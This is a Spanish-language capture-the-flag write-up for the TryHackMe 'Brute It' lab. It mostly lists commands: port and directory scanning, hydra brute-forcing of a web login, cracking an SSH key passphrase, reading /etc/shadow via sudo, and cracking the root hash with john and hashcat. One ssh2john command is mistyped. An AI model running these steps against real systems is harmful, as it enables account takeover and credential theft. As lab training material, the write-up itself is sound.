---
title: "bruteit"
description: "bruteit"
pubDate: 2025-05-20
---

https://tryhackme.com/r/room/bruteit

# Fase de reconocimiento

## Buscamos puertos abiertos

````
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.201.81
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240505181432.png)

## Reconocimiento de servicios

````
nmap -sVC -p22,80 -Pn 10.10.201.81
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240505181501.png)

## Gobuster

````
gobuster dir -u http://10.10.201.81 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240505182046.png)

# Fase de ataque

En el código fuente encontramos el username
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240505183119.png)

## Hydra

````
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.201.81 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid"
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240505183607.png)
Nos conectamos y encontramos la clave privada de John

````
chmod 600 id_rsa
````

## John

La clave tiene prassphrase

````
ssh2john id_rsa Z idrsa.john
````

````
john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240505184627.png)

Nos conectamos por SSH
\[-\] ==pwned!==

# Privilege Escalation

Podemos ejecutar el siguiente comando con contraseña para saber que comandos con privilegios puede utilizar el usuario

````
sudo -l
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240505190149.png)
Podemos ver archivos con permiso de root con /bin/bash.
Las contraseñas se encuntran en  /etc/shadow hasheadas

````
PASS=/etc/shadow; sudo cat "$PASS"
````

````
PASS=/etc/passwd; sudo cat "$PASS"
````

La crackeamos

1. Las combinamos

````
unshadow passwd.txt shadow.txt > passwords
````

2. Crackeamos
   2 Fomas:

````
john --wordlist=/usr/share/wordlists/rockyou.txt passwords
````

````
hashcat -m 1800 passwords /usr/share/wordlists/rockyou.txt
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240505193229.png)
\[+\] ==pwned!==
